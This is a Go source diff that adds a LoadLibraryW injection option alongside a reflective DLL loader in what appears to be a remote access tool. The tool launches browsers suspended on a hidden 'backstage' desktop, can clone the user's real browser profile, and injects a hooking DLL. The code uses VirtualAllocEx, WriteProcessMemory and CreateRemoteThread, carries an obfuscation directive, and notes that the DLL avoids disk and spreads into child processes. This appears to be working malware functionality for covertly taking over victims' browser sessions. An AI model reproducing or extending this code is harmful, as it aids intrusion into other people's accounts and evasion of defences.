@@ -3,7 +3,9 @@
 package capture
 
 import (
+	"crypto/sha256"
 	"encoding/binary"
+	"encoding/hex"
 	"fmt"
 	"log"
 	"os"
@@ -47,6 +49,28 @@ type LaunchStatusFunc func(step string, success bool, detail string)
 
 var backstageDXGIStatusCallback atomic.Value
 
+// InjectionMethod selects how the backstage DLL is injected into the target
+// process.
+type InjectionMethod string
+
+const (
+	// InjectionMethodReflective uses the reflective loader injected via
+	// CreateRemoteThread. The DLL never touches disk.
+	InjectionMethodReflective InjectionMethod = "reflective"
+	// InjectionMethodLoadLibrary stages the DLL to a temp file and injects it
+	// with CreateRemoteThread + LoadLibraryW.
+	InjectionMethodLoadLibrary InjectionMethod = "loadlibrary"
+)
+
+func normalizeInjectionMethod(method string) InjectionMethod {
+	switch strings.ToLower(strings.TrimSpace(method)) {
+	case "loadlibrary", "loadlibraryw", "disk":
+		return InjectionMethodLoadLibrary
+	default:
+		return InjectionMethodReflective
+	}
+}
+
 const (
 	PROCESS_CREATE_THREAD     = 0x0002
 	PROCESS_QUERY_INFORMATION = 0x0400
@@ -59,6 +83,7 @@ const (
 
 	MEM_COMMIT             = 0x1000
 	MEM_RESERVE            = 0x2000
+	PAGE_READWRITE         = 0x04
 	PAGE_EXECUTE_READWRITE = 0x40
 
 	INFINITE_WAIT = 0xFFFFFFFF
@@ -166,7 +191,8 @@ func enableDebugPrivilege() {
 // StartbackstageProcessInjected starts a process suspended on the backstage desktop,
 // injects the reflective DLL, then resumes it.
 // searchPath/replacePath are passed as environment variables for the DLL hooks.
-func StartbackstageProcessInjected(filePath string, dllBytes []byte, searchPath, replacePath string, display int) (uint32, error) {
+// method selects the injection technique: "reflective" (default) or "loadlibrary".
+func StartbackstageProcessInjected(filePath string, dllBytes []byte, searchPath, replacePath string, display int, method string) (uint32, error) {
 	if filePath == "" {
 		return 0, fmt.Errorf("empty file path")
 	}
@@ -181,6 +207,7 @@ func StartbackstageProcessInjected(filePath string, dllBytes []byte, searchPath,
 		searchPath:  searchPath,
 		replacePath: replacePath,
 		display:     display,
+		method:      method,
 	}, 30*time.Second)
 	if err != nil {
 		return 0, err
@@ -188,7 +215,7 @@ func StartbackstageProcessInjected(filePath string, dllBytes []byte, searchPath,
 	return result.pid, result.err
 }
 
-func StartbackstageBrowserInjected(browser string, exePath string, dllBytes []byte, clone bool, cloneLite bool, killIfRunning bool, display int, onProgress CloneProgressFunc, onDXGIStatus DXGIStatusFunc, onLaunchStatus LaunchStatusFunc) error {
+func StartbackstageBrowserInjected(browser string, exePath string, dllBytes []byte, clone bool, cloneLite bool, killIfRunning bool, display int, method string, onProgress CloneProgressFunc, onDXGIStatus DXGIStatusFunc, onLaunchStatus LaunchStatusFunc) error {
 	if onDXGIStatus != nil {
 		backstageDXGIStatusCallback.Store(onDXGIStatus)
 	}
@@ -235,7 +262,7 @@ func StartbackstageBrowserInjected(browser string, exePath string, dllBytes []by
 
 	if !clone {
 		notify("launch", true, "starting without profile cloning")
-		pid, err := StartbackstageProcessInjected(exePath, dllBytes, "", "", display)
+		pid, err := StartbackstageProcessInjected(exePath, dllBytes, "", "", display, method)
 		if err != nil {
 			notify("launch", false, fmt.Sprintf("CreateProcess failed: %v", err))
 			return err
@@ -296,7 +323,7 @@ func StartbackstageBrowserInjected(browser string, exePath string, dllBytes []by
 	}
 
 	notify("launch", true, "starting with cloned profile")
-	pid, err := StartbackstageProcessInjected(exePath, dllBytes, realUserData, cloneDir, display)
+	pid, err := StartbackstageProcessInjected(exePath, dllBytes, realUserData, cloneDir, display, method)
 	if err != nil {
 		notify("launch", false, fmt.Sprintf("CreateProcess failed: %v", err))
 		return err
@@ -319,8 +346,8 @@ func StartbackstageBrowserInjected(browser string, exePath string, dllBytes []by
 }
 
 // StartbackstageChromeInjected is kept for backward compatibility.
-func StartbackstageChromeInjected(chromePath string, dllBytes []byte) error {
-	return StartbackstageBrowserInjected("chrome", chromePath, dllBytes, true, false, true, 0, nil, nil, nil)
+func StartbackstageChromeInjected(chromePath string, dllBytes []byte, method string) error {
+	return StartbackstageBrowserInjected("chrome", chromePath, dllBytes, true, false, true, 0, method, nil, nil, nil)
 }
 
 type browserInfo struct {
@@ -1002,7 +1029,7 @@ func calcDirSize(dir string) int64 {
 	return total
 }
 
-func startbackstageProcessInjectedOnThread(filePath string, dllBytes []byte, searchPath, replacePath string, display int) (uint32, error) {
+func startbackstageProcessInjectedOnThread(filePath string, dllBytes []byte, searchPath, replacePath string, display int, method string) (uint32, error) {
 	//garble:controlflow block_splits=10 junk_jumps=10 flatten_passes=2
 	if filePath == "" {
 		return 0, fmt.Errorf("empty file path")
@@ -1029,19 +1056,20 @@ func startbackstageProcessInjectedOnThread(filePath string, dllBytes []byte, sea
 	}
 	log.Printf("backstage inject: created suspended process PID %d", pid)
 
-	// Inject the reflective DLL
-	if err := reflectiveInject(hProcess, dllBytes); err != nil {
+	// Inject the backstage DLL
+	injMethod := normalizeInjectionMethod(method)
+	if err := injectIntoProcess(hProcess, dllBytes, injMethod); err != nil {
 		procCloseHandle.Call(hProcess)
 		procCloseHandle.Call(hThread)
 		terminateProcess(hProcess)
 		procCloseHandle.Call(shmHandle)
 		return 0, fmt.Errorf("DLL injection failed: %v", err)
 	}
-	log.Printf("backstage inject: DLL injected into PID %d", pid)
+	log.Printf("backstage inject: DLL injected into PID %d (method=%s)", pid, injMethod)
 
-	// The DLL's InstallNtApiHooks has run (reflectiveInject waits for the
-	// loader thread). The DLL opened the shared section, so we can release
-	// our handle now.
+	// The DLL's InstallNtApiHooks has run (injectIntoProcess waits for the
+	// injector thread to finish, so DllMain already opened the shared section).
+	// We can release our handle now.
 	procCloseHandle.Call(shmHandle)
 
 	procCloseHandle.Call(hProcess)
@@ -1417,6 +1445,128 @@ func isRDIEnvironmentEntry(entry string) bool {
 	default:
 		return false
 	}
+}
+
+func injectIntoProcess(hProcess uintptr, dllBytes []byte, method InjectionMethod) error {
+	switch method {
+	case InjectionMethodLoadLibrary:
+		dllPath, err := stageInjectionDLL(dllBytes)
+		if err != nil {
+			return fmt.Errorf("failed to stage DLL for LoadLibrary: %v", err)
+		}
+		log.Printf("backstage inject: using LoadLibrary injection from %s", dllPath)
+		if err := loadLibraryInject(hProcess, dllPath); err != nil {
+			_ = os.Remove(dllPath)
+			return err
+		}
+		// The DLL is fully resident in the target and self-injects into child
+		// processes from the shared section, so the staged file is no longer
+		// needed.
+		_ = os.Remove(dllPath)
+		return nil
+	default:
+		return reflectiveInject(hProcess, dllBytes)
+	}
+}
+
+// stageInjectionDLL writes the DLL bytes to a temp file so it can be loaded
+// with LoadLibraryW. The file name is content-addressed so repeat injections
+// reuse an existing file.
+func stageInjectionDLL(dllBytes []byte) (string, error) {
+	sum := sha256.Sum256(dllBytes)
+	hash := hex.EncodeToString(sum[:])
+	dir := filepath.Join(os.TempDir(), "Overlord", "backstage")
+	if err := os.MkdirAll(dir, 0700); err != nil {
+		return "", fmt.Errorf("create staging dir: %w", err)
+	}
+	target := filepath.Join(dir, "BackstageInjection-"+hash+".x64.dll")
+	if st, err := os.Stat(target); err == nil && st.Size() == int64(len(dllBytes)) {
+		return target, nil
+	}
+	tmp := target + ".tmp"
+	if err := os.WriteFile(tmp, dllBytes, 0600); err != nil {
+		return "", fmt.Errorf("write staging file: %w", err)
+	}
+	if err := os.Rename(tmp, target); err != nil {
+		_ = os.Remove(tmp)
+		if st, statErr := os.Stat(target); statErr == nil && st.Size() == int64(len(dllBytes)) {
+			return target, nil
+		}
+		return "", fmt.Errorf("finalize staging file: %w", err)
+	}
+	return target, nil
+}
+
+// loadLibraryInject uses the classic LoadLibraryW injection: it writes the
+// DLL path into the target process and runs LoadLibraryW there via
+// CreateRemoteThread. kernel32 is mapped at the same base across processes on
+// the same boot, so the local LoadLibraryW address is used for the remote
+// thread start routine.
+func loadLibraryInject(hProcess uintptr, dllPath string) error {
+	loadLibAddr := kernel32.NewProc("LoadLibraryW").Addr()
+	if loadLibAddr == 0 {
+		return fmt.Errorf("resolving LoadLibraryW failed")
+	}
+	log.Printf("backstage inject: LoadLibraryW at 0x%x", loadLibAddr)
+
+	pathBytes, err := syscall.UTF16FromString(dllPath)
+	if err != nil {
+		return fmt.Errorf("UTF16FromString(%q): %v", dllPath, err)
+	}
+
+	remotePath, _, _ := procVirtualAllocEx.Call(
+		hProcess,
+		0,
+		uintptr(len(pathBytes)*2),
+		MEM_RESERVE|MEM_COMMIT,
+		PAGE_READWRITE,
+	)
+	if remotePath == 0 {
+		return fmt.Errorf("VirtualAllocEx failed")
+	}
+
+	var bytesWritten uintptr
+	ret, _, _ := procWriteProcessMemory.Call(
+		hProcess,
+		remotePath,
+		uintptr(unsafe.Pointer(&pathBytes[0])),
+		uintptr(len(pathBytes)*2),
+		uintptr(unsafe.Pointer(&bytesWritten)),
+	)
+	if ret == 0 {
+		return fmt.Errorf("WriteProcessMemory failed")
+	}
+
+	var threadID uintptr
+	hThread, _, _ := procCreateRemoteThread.Call(
+		hProcess,
+		0,
+		0,
+		loadLibAddr,
+		remotePath,
+		0,
+		uintptr(unsafe.Pointer(&threadID)),
+	)
+	if hThread == 0 {
+		return fmt.Errorf("CreateRemoteThread failed")
+	}
+
+	waitRet, _, waitErr := procWaitForSingleObject.Call(hThread, 30000)
+	var exitCode uint32
+	if ret, _, callErr := procGetExitCodeThread.Call(hThread, uintptr(unsafe.Pointer(&exitCode))); ret != 0 {
+		log.Printf("backstage inject: remote LoadLibrary thread finished wait=0x%x module=0x%x", waitRet, exitCode)
+	} else {
+		log.Printf("backstage inject: GetExitCodeThread failed after wait=0x%x: %v", waitRet, callErr)
+	}
+	procCloseHandle.Call(hThread)
+
+	if waitRet == 0xFFFFFFFF {
+		return fmt.Errorf("remote LoadLibrary thread wait failed: %v", waitErr)
+	}
+	if exitCode == 0 {
+		return fmt.Errorf("LoadLibraryW failed in remote process")
+	}
+	return nil
 }
 
 func reflectiveInject(hProcess uintptr, dllBytes []byte) error {
